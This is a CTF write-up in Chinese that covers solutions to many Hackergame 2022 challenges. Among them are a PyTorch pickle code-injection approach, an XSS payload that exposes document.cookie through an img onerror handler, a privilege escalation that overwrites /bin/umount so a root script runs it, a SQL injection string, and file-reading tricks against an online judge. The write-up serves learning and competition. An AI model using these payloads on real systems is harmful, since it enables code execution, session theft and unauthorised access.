# Hackergame 2022

GWDx

## 环境

+ Debian Bookworm
+ Python 3.10

## 完成的题目

### 16 二次元神经网络

> 2022 年 10 月 22 日 12 时，Hackergame 2022 正式开始

签到、Xcaptcha、Latex 机器人各做了十几分钟，然而都没做出来

> 12:40 - 13:30

开始炼这题的丹。感觉参数量有点小，Loss 不太能降的下来

> 14:20

发现这题是 web 类型的题目，感觉并不是让我们训练网络或者解不等式。

我对 AI 绘画很感兴趣，之前 bilibili 上 NovelAI 相关的视频看了不少。其中有一个 [你的NovelAI模型，极有可能被恶意攻击](https://www.bilibili.com/video/BV1BN4y1c7KX/) 提到了 pickle 模块可能存在安全问题。但是里面的代码只展示了 pkl 文件的读取和写入，没有 pt 文件的读取和写入。

把 pt 文件解压缩可以得到一个 pkl，然而直接用 packle 载入会报错。把 PyTorch 版本换成题目中的 1.9 也不行。尝试调试库代码，以失败告终。

> 15:30

Google 了好久，终于用 `pickle Serialization danger pytorch` 找到了一个示例 [The hidden dangers of loading open-source AI models (ARBITRARY CODE EXPLOIT!)](https://www.youtube.com/watch?v=2ethDz9KnLk)，作者写了一个库 [yk/patch-torch-save](https://github.com/yk/patch-torch-save)，这个函数可以替换 `torch.save` 实现代码注入。

试了一下在要上传的模型中注入 `exit` 进去，发现确实可以让后台崩掉。

实现时需要阻止在执行注入的代码后按照 pt 文件后面的数据保存结果。于是重写 `json.dump` 函数，让服务器在调用这个函数时把数据集的前十张图片导出到 `/tmp/result.json`

> 完整代码见 [patch.py](22/patch.py)

感谢 Stable Diffusion，感谢 NovelAI，我拿到了第一个 flag，获得了这一题的一血，守护了科大这片二次元的土地。

<br>

### 1 签到

一开始点开签到，画了一下没画出来，开始把网页下载下来看代码。

后来感觉分析 JavaScript 代码不是签到题该有的难度。忽然发现点击提交后 URL 会变，把请求内容改成 2022 就可以了。

<br>

### 2 猫咪问答喵

1. 百度 `USTC NEBULA 成立时间`，[中国科大“星云战队”获信息安全铁人三项赛华东区企业赛冠军](https://www.cas.cn/djcx/wm/201706/t20170616_4605231.shtml) 中提到成立时间是 2017-03
2. 找到 [gnome-wayland-user-perspective.pdf](https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2022.9.20_%E8%BD%AF%E4%BB%B6%E8%87%AA%E7%94%B1%E6%97%A5/slides/gnome-wayland-user-perspective.pdf)，里面的是 Kdenlive 的界面
3. 发现会提示答对了几道题，所以网上随便查，往上填，发现是 12。
4. 用 Google 查找 `CVE-2021-4034 torvalds/linux.git` 得到 [New CVE entries this week](https://lore.kernel.org/all/CAODzB9proCGmsbhFuuOhx=pgwqsGsXEjz2Smd+S97_gFL-A5Dw@mail.gmail.com/T/)
5. 一开始查不到，Wiki 上找了一些域名碰运气，失败。
后来发现 Bing 国际版直接查找 `MD5:e4:ff:65:d7:be:5d:c8:44:1d:89:6b:50:f5:50:a0:ce` 即可得到 `sdf.org`
百度垃圾，Google 垃圾。
6. 找到 [关于实行新的网络费用分担办法的通知](https://www.ustc.edu.cn/info/1057/4931.htm)，但 2011-01-01 不对。
    用脚本枚举出来是 2003-03-01

<br>

### 3 家目录里的秘密

#### VS Code 里的 flag

第一问 VSCode 一开，查 `flag` 就行

#### Rclone 里的 flag

第二问找到 `~/.bash_history`
以及 `~/.config/rclone/rclone.conf`，但里面的 FTP 连不上。在家目录里找域名或 IP 填进去都不行。

后来照着 `~/.bash_history` 打了一遍命令，发现 Rclone 存储的 `pass` 比输入的长，猜测进行了加密。

查到了 [How to retrieve a crypt password from a config file](https://forum.rclone.org/t/how-to-retrieve-a-crypt-password-from-a-config-file/20051/3)

装个 `go`，把里面的代码跑一跑，flag 就出来了。


<br>

### 4 HeiLang

正则表达式替换

```python
import re

with open('getflag.hei.py', 'r') as f:
    code = f.read()

result = []
for line in code.split('\n'):
    # find a[(.*)] = (.*)
    if re.match(r'a\[(.*)\] = (.*)', line):
        match = re.match(r'a\[(.*)\] = (.*)', line)
        print(match.group(1), match.group(2))
        for i in match.group(1).split(' | '):
            result.append('a[' + i + '] = ' + match.group(2))
    else:
        result.append(line)

with open('getflag.hei.py', 'w') as f:
    f.write('\n'.join(result))
```

<br>


### 5 Xcaptcha

使用 Python 的 Selenium 库，模拟人工操作。一开始代码写错了，用 Kazam 录屏后才发现错误

代码见 [run.py](5/run.py)

<br>

### 6 旅行照片 2.0

#### 照片分析

KDE 自带的图片管理器可以显示图片的 EXIF 信息。

> 闪光灯对应的是 `Flash` 一栏，当时没注意到

#### 社工入门

+ 使用 `welcome to zozo stadium japan` 查到了。邮编用 Google Postcodes 或者 Bing 查到。注意拍摄地点在马路对面
+ 手机分辨率：用京东查小米手机，看着像 Redmi Note 9，百度百科说分辨率是 2340x1080
+ 用 [flightradar24](https://www.flightradar24.com/) 查航班。根据飞机方向判断起飞机场是东京机场或者南面的一个机场。然后用脚本枚举

<br>


### 7 猜数字

每次有 10^-6 次方的概率一下子猜对，就算每次交互 1s，也要 11 天。所以不可能暴力。

观察了一下随机数，没有发现问题。

后来看到这段代码，估计是 `NaN`

```java
var isLess = guess < this.number - 1e-6 / 2;
var isMore = guess > this.number + 1e-6 / 2;

var isPassed = !isLess && !isMore;
```

不知道为什么 Firefox 的重发有问题，我最后是用 Python 发的。

```xml
<state><guess>NaN</guess></state>
```

<br>


### 8 LaTeX 机器人

#### 纯文本

Copilot 教会我用 `\input`

```latex
\input{/flag1}
```

> 刚开始可能是没加 `/`，所以报错了

#### 特殊字符混入

很多需要导入包的都不太行。Google 了好久，终于找到 [How to import a text file](https://tex.stackexchange.com/questions/38909/how-to-import-a-text-file-with-accent-special-chars)，发现可以用 `\catcode`

```latex
\catcode`\_=12
\catcode`\#=12
\input{/flag2}
```

<br>


### 9 Flag 的痕迹

一开始以为要找出用户名和密码。

后来点着点着发现 URL 里有 `do=`。源码里见过，根据源码改成 `do=diff`

http://202.38.93.111:15004/doku.php?id=start&do=diff

然后鼠标点之前的版本，就能看到 flag 了。

<br>

### 10 安全的在线测评

#### 无法 AC 的题目

> 这题让我想起了 [如何看待 NOIP2020 某选手通过修改输入文件获得了第三题的满分？](https://www.zhihu.com/question/433907534)

`fopen` 目标输出文件，然后打印出来即可

```c
#include <stdio.h>

int main(int argc, char* argv[]) {
    // read ./data/static.out and print
    FILE* fp = fopen("./data/static.out", "r");
    char buf[1024];
    while (fgets(buf, 1024, fp) != NULL)
        printf("%s", buf);
    return 0;
}
```

得到 `flag{the_compiler_is_my_eyes_deba6df85e}`

#### 动态数据

`fopen` 不行了，没有读权限。

上一小问的 flag 提示在编译时 `include` 目标文件。但直接 include 不行，因为两个数字间有换行。

[Embedding resources in executable using GCC](https://stackoverflow.com/questions/4158900/embedding-resources-in-executable-using-gcc) 中提到了 [incbin](https://github.com/graphitemaster/incbin) 这个库，可以包含数据文件

代码见 [raw.c](10/raw.c)

为了避免包含这个库，可以用 `gcc -E` 预处理一下，然后把没用的代码删掉，提交的文件见 [submit.c](10/submit.c)

> 暑假时查过编译时 include 文件的资料，但当时没找到，这次学到了。

<br>

### 11 线路板

安装 Gerbv

加载所有 `*.gbr` 文件，然后发现 `fla` 字样，把所有挡住的圆盘删掉，就能看到 flag 了。

<br>

### 12 Flag 自动机

直接打开有两个按钮，鼠标左键 + Alt + Space 乱按有概率颠倒按钮，但还是会显示没有管理员权限。

使用 Detect_it_Easy，没有发现壳。

用文本编辑器打开文件会显示一些文字，比如 `flag_machine.txt`

学习了一下 IDA 的使用。找到 `fwrite` 的位置。根据反汇编的代码，将判断语句 `je` 更改为 

<br>

### 13 微积分计算小练习

`bot.py` 调用 selenium 打开网页。需要更改 URL 的参数获得 cookie

查看 http://202.38.93.111:10056/share?result=MTAwOkdXRHg%3D 的页面源代码

微积分网站中的 URL 是经过 base64 和 URL 编码的

解码后是 `GWDx:100`

查看 JavaScript 代码

```javascript
const result = urlParams.get('result');
const b64decode = atob(result);
const colon = b64decode.indexOf(":");
const score = b64decode.substring(0, colon);
const username = b64decode.substring(colon + 1);

document.querySelector("#greeting").innerHTML = "您好，" + username + "！";
document.querySelector("#score").innerHTML = "您在练习中获得的分数为 <b>" + score + "</b>/100。";
```

经过尝试，填入 `<script>` 不会被更新。而 [浅谈XSS攻击的那些事](https://zhuanlan.zhihu.com/p/26177815) 中提到可以用 `<img src=1 onerror=` 进行 XSS 攻击

所以构造

```html
<img src="1" onerror=document.querySelector("#greeting").innerHTML=document.cookie>
```

加上 `:`，base64 和 URL 编码后得到

```
http://202.38.93.111:10056/share?result=OjxpbWcgc3JjPSIxIiBvbmVycm9yPWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNncmVldGluZyIpLmlubmVySFRNTD1kb2N1bWVudC5jb29raWU%2B
```

填入提交网站即可获得 flag


<br>

### 14 杯窗鹅影

#### flag1

`fopen` 直接读就可以了

```
#include <stdio.h>
#include <stdlib.h>

int main() {
    // open /flag1 and print it
    FILE* f = fopen("/flag1", "r");
    char buf[100];
    fgets(buf, 100, f);
    printf("%s", buf);
    fclose(f);
    return 0;
}
```

#### flag2

不知道为什么我的电脑上可以，评测机上 `execve` 不行，`execveat` 也不行，而 `execveat` 的汇编也存在 `Permission` 方面的问题

后来尝试用 windows 的 API，把 start.exe 附到代码里，但是评测机上的 start.exe 没有打印输出结果的选项

最后发现用 windows 直接创建进程就可以了

```c
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

int executeFile() {
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!CreateProcess("\\\\?\\unix\\readflag", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed (%d)\n", GetLastError());
        return 1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main(int argc, char* argv[]) {
    for (int i = 0; i < argc; i++)
        printf("argv[%i]: %s\n", i, argv[i]);
    executeFile();
}
```

<br>

### 15 蒙特卡罗轮盘赌

随机数种子取决于 `time(0) + clock()`。其中 `clock()` 表示程序运行的 CPU 时钟数，本地运行大概在 500-1500 之间。

一开始假设其为某个值和服务器枚举，结果试了 1000 次都不行。

后来想到可以先随便输两个数字，把前两题的答案套出来，然后再枚举。

代码见 [solve.c](15/solve.c)

<br>


### 17 惜字如金

#### HS384

手动还原一些字符

密钥部分写个扩写程序，暴力枚举，求出密钥的 LCS 与目标匹配度最高的字符串

注意原来的字符串后面有些地方可以省略 `e`

代码见 [solve-HS384.py](17/solve-HS384.py)

> 做第二问 RS384 时忘记 a e i o u 不做处理的了


<br>

### 18 不可加密的异世界

#### 疏忽的神

这题要求输入 `name` `IV` `key` 加密算法 分组模式，使得 `pass = name + "Open the door!"` 加密后的结果为其自身。

学习了一下块加密的算法、填充方式等信息

加密算法选择 AES，因为明文长度小于 16 字节，可以塞进 AES 的一个块里

这题选择 CBC，使用字节反转攻击

CBC 的公式是

$$
C_1 = E(K, P_1 \oplus IV) \\
$$

即

$$
IV = P_1 \oplus D(K, C_1) \\
$$

$C_1 = P_1 = pass$，K 可以随意设置，利用上述公式可以求出 IV

代码见 [1.py](18/1.py)


#### 心软的神

这题给定一个字符串，可以选择 加密算法 分组模式，每次可以输入不同的 `key` `IV`，要求每次的块的加密结果为其自身。

这题还是选 CBC

$$
C_1 = E(K, P_1 \oplus IV) \\
C_{n+1} = E(K, P_{n+1} \oplus C_n) \\
$$

即

$$
C_n = P_{n+1} \oplus D(K, C_{n+1}) \\
IV = P_1 \oplus D(K, C_1) \\
$$

$P_n = C_n$，为给定字符串的一个块，K 可以随意设置，利用上述公式可以求出各个 IV

代码见 [2.py](18/2.py)

> 第三问推出 CBC 的公式了，但没想到逆 CRC128，以为是碰撞


<br>


### 19 置换魔群

#### 置换群上的 RSA

secret 和 public 的 tuple 数估计是相等的

$$
public ^ {public.order()} = 1 \\
secret ^ e = public
$$

所以求出 e 对于 `public.order()` 的逆元 d

$$
public ^ d = secret
$$

代码见 [RSA.py](19/RSA.py)


#### 置换群上的 DH

观察以下群 1-7 次方的变化

```python
ic|      raw.standard_tuple: [(1, 2, 9, 5, 8, 4), (3,), (6, 7, 10)]
ic| (raw**2).standard_tuple: [(1, 9, 8), (2, 5, 4), (3,), (6, 10, 7)]
ic| (raw**3).standard_tuple: [(1, 5), (2, 8), (3,), (4, 9), (6,), (7,), (10,)]
ic| (raw**4).standard_tuple: [(1, 8, 9), (2, 4, 5), (3,), (6, 7, 10)]
ic| (raw**5).standard_tuple: [(1, 4, 8, 5, 9, 2), (3,), (6, 10, 7)]
ic| (raw**6).standard_tuple: [(1,), (2,), (3,), (4,), (5,), (6,), (7,), (8,), (9,), (10,)]
ic| (raw**7).standard_tuple: [(1, 2, 9, 5, 8, 4), (3,), (6, 7, 10)]
```

如果知道 raw 和 raw^n，可以根据 raw^n 的每个 tuple 中第一个和第二个元素在 raw 中的位置差，列出同余方程组，然后用中国剩余定理求解

代码见 [DH.py](19/DH.py)


#### 置换群上的超大离散对数

这题允许自己选择两个群，然后对方算出它们的 key 次方。

最好使两个群中所有 tuple 的 lcm 尽可能大。

+ 首先想到的尽可能多塞素数，计算和不超过 2n 的前几个素数，按照从大到小的顺序生成 tuple 塞进两个群中
+ 此外，一些素数的次方数也是可行的，例如 25,27,32

不过由于只是按照贪心算法，在大多数时候并不能得到足够大的解。所以将以下函数更改参数了共计 36 次计算，然后取最大值。人品好就能过 15 关

```python
selectPrimesGen(primeList, n, True, [64, 49, 27, 25]),
```

> 这好像就是背包问题的变种，当时没想

代码见 [DH+.py](19/DH+.py)


<br>

### 20 光与影

一开始以为改代码以后网页显示不出来是因为程序限制了 Hash，后来发现仅仅是还没编译出来而已

发现 fragment-shader.js 的 t1SDF 里有很多点

在脑袋里模拟了一下，第一个字母的上面部分有点像 `f`
Python 画了一下，发现 `t1SDF` 里的点是 `flag`

但其他几个函数里的点似乎都是经过变换的，不可能用 Python 再画一遍。

看 `t5SDF` 比较短，可能是用来遮挡 flag 的，把和它相关的删掉即可。

```c++
float sceneSDF(vec3 p, out vec3 pColor) {
    pColor = vec3(1.0, 1.0, 1.0);

    vec4 pH = mk_homo(p);
    vec4 pTO = mk_trans(35.0, -5.0, -20.0) * mk_scale(1.5, 1.5, 1.0) * pH;

    float t1 = t1SDF(pTO.xyz);
    float t2 = t2SDF((mk_trans(-45.0, 0.0, 0.0) * pTO).xyz);
    float t3 = t3SDF((mk_trans(-80.0, 0.0, 0.0) * pTO).xyz);
    float t4 = t4SDF((mk_trans(-106.0, 0.0, 0.0) * pTO).xyz);
    // float t5 = t5SDF(p - vec3(36.0, 10.0, 15.0), vec3(30.0, 5.0, 5.0), 2.0);

    float tmin = min(min(min(t1, t2), t3), t4);
    return tmin;
}
```

<br>


### 23 链上记忆大师

#### 记忆练习

配置一下 solidity，然后学着写个记忆数字并能读取的合约

```solidity
contract MemoryMaster {
    uint256 public n;
    function memorize(uint256 nn) external {
        n = nn;
    }
    function recall() external view returns (uint256) {
        return n;
    }
}
```

> 后两问没想到能够使用 `gas` 传递信息
>
> 在想第三问能不能通过 view 函数调用 library function（`contract` 外的函数）来改变状态，[Solidity 文档](https://docs.soliditylang.org/en/latest/contracts.html#view-functions) 里说 `library function` 没有 view 的运行时检查


<br>

### 24 片上系统

#### 引导扇区

metadata 里提到了 Sigrok。首先，安装 Sigrok 和 PulseView。

参考 [Getting Started with a $10 Logic Analyzer using Sigrok and PulseView](https://www.youtube.com/watch?v=z8Tdz7eQ8n4) 学习使用，尝试采样并保存

将保存的 sr 文件中的三个文件替换为给定的文件，重新用 PulseView 打开。

添加 SPI 解码器，设置变化最频繁的信号为 CLK，最不频繁的信号为 CS，其他两个随意。然后导出 txt，某个信号的最后一行 ASCII 解码后就是 flag

> 第二问：
> 没配好 RISC-V 的反汇编环境。看到 `Video outputed` 以为前面的代码已经把字符输出到屏幕上了。


<br>

### 25 传达不到的文件

`ps` 发现父进程是 `/etc/init.d/rcS`，这个文件设置了权限，它的最后几行是

```bash
setsid /bin/cttyhack setuidgid 1000 /bin/sh

umount /proc
umount /tmp

poweroff -d 0  -f
```

> 这道题之后是在手机上做的，手机上真难打命令

去查了一下恰好看到 [change-others](https://ctf-wiki.org/pwn/linux/kernel-mode/aim/privilege-escalation/change-others/#poweroff_cmd)，其中提到可以劫持 `root` 程序将要运行的 `poweroff` 命令。

查看文件 `ls -l /sbin`，发现竟然都是 `rwx`，`/bin` 下也是。经过一系列命令的组合，通过

```bash
rm /bin/umount
echo "#!/bin/sh" > /bin/umount
echo "cat /flag2" >> /bin/umount
chmod +x /bin/umount
exit
```

就可以拿到第二个 Flag。

而第一个 Flag 是同样的道理

```bash
rm /bin/umount
echo "#!/bin/sh" > /bin/umount
echo "cat /chall" >> /bin/umount
chmod +x /bin/umount
exit
```

<br>

### 26 看不见的彼方

`seccomp` 限制了网络的使用

创建管道似乎需要能访问相同路径的文件，行不通。

找了个共享内存的代码 [进程间的通信方式（一）：共享内存](https://zhuanlan.zhihu.com/p/37808566)。但是由于不能访问相同目录，把 `ftok` 改成特定值即可（百度百科偶尔还是有用处的）

> 完整代码见 [alice.c](26/alice.c) 和 [bob.c](26/bob.c)

> 如果上传提示 glibc 版本不兼容，在编译时加上 `-static`

<br>


### 27 量子藏宝图

> 我看到数学公式就犯困

第一问，找到一份代码，改改运行

第二问，也找一份代码，把元件都标上，运行

> 代码见 [qkd.py](27/qkd.py) 和 [BernsteinVaziraniAlgorithmSimple.ipynb](27/BernsteinVaziraniAlgorithmSimple.ipynb)
> 分别参考了 [videlanicolas/QKD](https://github.com/videlanicolas/QKD) 和 [atilsamancioglu/QX05-BernsteinVaziraniAlgorithmSimple](https://github.com/atilsamancioglu/QX05-BernsteinVaziraniAlgorithmSimple/)

<br>

### 28 《关于 RoboGame 的轮子永远调不准速度这件事》

原来以为是要找漏洞。后来发现 `r T` 可以读数据

写个脚本把 EEPROM 的程序全读出来

一开始想把随机数的值改掉，结果没有作用

后来想把 + 9 改掉。结果把 3 号页的 9 抹掉以后，发现程序开始以奇怪的方式跑起来了，经过一段时间的观察，发现此时这个程序会按顺序分别将两边的数字设置为 1,0,1,2,0,0,0，而这道题目只需要出现连续 3 次相同的数字就可以过了。


```
w T 65 3 0 9 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
w 1 1 1     # 两边写 1
w 1 1 1     # 两边写 0
w 7 1 0     # 两边写 1    7 为 0
w 1 1 1     # 两边写 2
w 9 1 0     # 两边写 0    8 9 0 为 0
w 2 1 0     # 两边写 0    1 2 3 为 0
w 5 1 0     # 两边写 0    4 5 6 为 0
```

> 好像第一行改成 `w T 3 3 0 9` 就不行，推测是把寻址的基址给改到奇奇怪怪的地方了。

然后把所有轮子的速度读出来，十六进制转 ASCII 就过了

代码见 [script.py](28/script.py)

<br>

### 30 企鹅拼盘

#### 这么简单我闭眼都可以！

手动枚举


#### 大力当然出奇迹啦~

改改程序，暴力

代码见 [solve-16.py](30/solve-16.py)

> 第三问不会


<br>

### 32 火眼金睛的小 E

#### 有手就行

用 `objdump` 转成汇编，分析代码间的行数、LCS 的匹配程度。
按照这两个特征排序，枚举所有函数

> 其实如果只做第一问直接枚举所有函数就行了

代码写得比较乱，就不放了

<br>

## 未完成

| 题目名称           | 说明                                                         |
| ------------------ | ------------------------------------------------------------ |
| 21 矩阵之困        | 拿 z3 解了几个小时没解出来                                   |
| 22 你先别急        | 发现可以 SQL 注入 `' or 1=1 #`。但我不太会 SQL 注入，不知道怎么继续 |
| 29 壹...壹字节？   | 我只会把所有一字节的字符发给服务器                           |
| 31 小 Z 的靓号钱包 | 配置好环境了，也知道随机数是 32 位的了。但代码有点没看懂     |
| 33 evilCallback    | 没发现有 `.diff` 文件，还以为要玄学测试。虽然发现了我大概率也做不出来 |

